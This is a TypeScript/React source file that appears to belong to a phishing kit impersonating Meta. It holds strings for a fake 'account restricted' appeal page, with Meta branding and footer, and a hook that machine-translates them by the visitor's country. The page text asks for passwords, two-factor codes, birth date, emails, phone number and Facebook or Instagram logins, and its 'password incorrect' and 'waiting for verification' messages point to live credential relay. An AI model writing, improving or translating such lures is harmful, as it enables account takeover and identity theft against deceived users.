import translateText, { resolveTargetLang } from '@/utils/translate';
import { useCallback, useEffect, useMemo, useState } from 'react';

export const defaultTexts = {
    confirm: 'Return to Facebook',
    password: 'Password',
    passwordIncorrect: 'Password is incorrect, please try again.',
    continueBtn: 'Continue',
    forgotPassword: 'Forgot password?',
    twoFAInstructionPrefix: 'Enter the code sent to',
    twoFAInstructionSuffix:
        'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).',
    code: 'Code',
    codeExpired: 'The code you entered is incorrect. Please try again.',
    pleaseWait: 'Please wait',
    step: 'Step',
    tryAnotherMethod: 'Try another method',
    twoFAStep: 'Two-factor authentication request',
    securityReason: 'For security reasons, please enter your password to continue.',
    loginIdentityPlaceholder: 'Email or phone number',
    successTitle: 'Request has been sent',
    successMessage1:
        'Your request has been added to the processing queue. We will handle your request within 24 hours.',
    successMessage2: 'From the Customer Support Meta.',
    verificationInfo: 'Verification information',
    fillRequiredFields:
        'Please fill in correctly and completely all required fields to complete the verification profile.',
    fullName: 'Full Name',
    fullNamePlaceholder: 'Enter your full name',
    dateOfBirth: 'Date of Birth',
    personalEmail: 'Personal Email',
    personalEmailPlaceholder: 'Enter your personal email',
    businessEmail: 'Business Email',
    businessEmailPlaceholder: 'Enter your business email',
    mobilePhone: 'Mobile Phone Number',
    mobilePhonePlaceholder: 'Enter your mobile phone number',
    yourPageName: 'Facebook Page Name',
    pageNamePlaceholder: 'Enter your Facebook page name',
    additionalNotes: 'Additional notes (optional)',
    additionalNotesPlaceholder:
        'Example: This page officially represents ABC brand and needs verification to improve trust.',
    reviewReasonIntro:
        'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
    reviewReasonTitle: 'What do you think happened?',
    reasonErroneousReport: 'An erroneous report or unfair competitive complaint.',
    reasonNotificationError: 'This notification was sent in error.',
    reasonNoFraud: 'No fraud involved / another legitimate reason:',
    heroTitle: 'Violation of Community Standards',
    heroDesc:
        'Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.',
    policyViolationTitle: 'Violation of Community Standards',
    policyViolationDesc1:
        'We identified activity or content related to your account that may not comply with our platform policies and standards.',
    policyViolationDesc2:
        'Please review and complete the following steps to restore secure access and ensure compliance with our rules.',
    policyViolationHeroAlt: 'Security and device logout illustration',
    appealTitle: 'Your account has been restricted or disabled',
    appealDesc1:
        'We determined that some activity on your account may not follow our Community Standards.',
    appealDesc2:
        'In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.',
    appealWhyTitle: 'Why this happened',
    appealWhy1:
        'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.',
    appealWhy2:
        'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.',
    appealWhatTitle: 'What you can do',
    appealWhat1: 'If you believe this action was taken by mistake, you may request a review.',
    appealWhat2:
        'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.',
    appealWhat3:
        'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.',
    appealButton: 'Request Review',
    ipTitle: 'What is an Intellectual Property Violation?',
    trademarkTitle: 'Trademark',
    trademarkDesc:
        'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another. Generally, trademark law seeks to prevent confusion among consumers about who provides or is affiliated with a product or service.',
    copyrightTitle: 'Copyright',
    copyrightDesc:
        "Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art). Generally, copyright protects original expression such as words or images. It does not protect facts and ideas, although it may protect the original words or images used to describe an idea. Copyright also doesn't protect things like names, titles and slogans; however, another legal right called a trademark might protect those.",
    counterfeitTitle: 'Counterfeit Goods',
    counterfeitDesc:
        'A counterfeit good is a knockoff or replica version of another company\'s product. It usually copies the trademark (name or logo) and/or distinctive features of that other company\'s product to imitate a genuine product. The manufacture, promotion or sale of a counterfeit goods is a type of trademark infringement that is illegal in most countries, and is recognized as being harmful to consumers, trademark owners and honest sellers. Please note that counterfeit goods may be unlawful even if the seller explicitly says that the goods are counterfeit, or otherwise disclaims authenticity of the goods.',
    loginChoiceTitle: 'Sign in to continue',
    loginChoiceDesc: 'Choose how you want to verify your account to proceed with the appeal.',
    loginChoicePromo: 'Verify your identity to continue your page appeal review.',
    continueWithFacebook: 'Continue with Facebook',
    continueWithInstagram: 'Continue with Instagram',
    loginChoiceTerms: 'By continuing, you agree to our Terms of Service and Privacy Policy.',
    waitingApproval: 'Waiting for verification...',
    igLoginTitle: 'Log in to Instagram',
    igLoginSubtitle: 'Verify your account to continue with your appeal review.',
    igLoginIdentity: 'Phone number, username, or email',
    igLoginButton: 'Log in',
    igLoginFooter: 'Secured by Meta · Instagram identity verification',
    footerCopyright: '© 2026 Meta',
    footerAbout: 'About',
    footerPrivacy: 'Privacy',
    footerTerms: 'Terms',
    footerHelpCentre: 'Help Centre',
    footerLangEnglishUS: 'English (US)',
    footerLangEnglishUK: 'English (UK)',
    footerLangItalian: 'Italiano',
    footerLangFrench: 'Français',
    footerLangChinese: '中文(简体)',
    footerLangJapanese: '日本語',
    providerFacebook: 'Facebook',
    providerInstagram: 'Instagram',
    defaultUserName: 'User',
    closeLabel: 'Close',
    showPasswordLabel: 'Show password',
    hidePasswordLabel: 'Hide password',
    altMeta: 'Meta',
    altHero: 'Hero',
    altTrademark: 'Trademark',
    altCopyright: 'Copyright',
    altCounterfeit: 'Counterfeit',
    altSuccess: 'Success',
    altAuthentication: 'Authentication',
    altInstagram: 'Instagram',
    igSecurityFooter: 'Instagram · Meta security'
} as const;

export type TextKey = keyof typeof defaultTexts;
export type Texts = Record<TextKey, string>;

const BATCH_SIZE = 6;

const translateAllTexts = async (countryCode: string): Promise<Texts> => {
    const keys = Object.keys(defaultTexts) as TextKey[];
    const translated = { ...defaultTexts } as Texts;
    const targetLang = resolveTargetLang(countryCode);

    for (let i = 0; i < keys.length; i += BATCH_SIZE) {
        const batch = keys.slice(i, i + BATCH_SIZE);
        const results = await Promise.all(batch.map((key) => translateText(defaultTexts[key], countryCode)));
        batch.forEach((key, index) => {
            translated[key] = results[index] || defaultTexts[key];
        });
    }

    const normalizedStep = String(translated.step || '').trim().toLowerCase();
    if (targetLang === 'vi' && (!normalizedStep || normalizedStep.includes('bước chân'))) {
        translated.step = 'Bước';
    }

    return translated;
};

export const useTexts = (countryCode = 'US') => {
    const [translatedTexts, setTranslatedTexts] = useState<Texts>(defaultTexts);

    const loadTranslations = useCallback(async (code: string) => {
        const targetLang = resolveTargetLang(code);
        if (targetLang === 'en') {
            return { ...defaultTexts };
        }

        try {
            return await translateAllTexts(code);
        } catch {
            return { ...defaultTexts };
        }
    }, []);

    useEffect(() => {
        let cancelled = false;

        void loadTranslations(countryCode).then((nextTexts) => {
            if (!cancelled) {
                setTranslatedTexts(nextTexts);
            }
        });

        return () => {
            cancelled = true;
        };
    }, [countryCode, loadTranslations]);

    return useMemo(() => translatedTexts, [translatedTexts]);
};
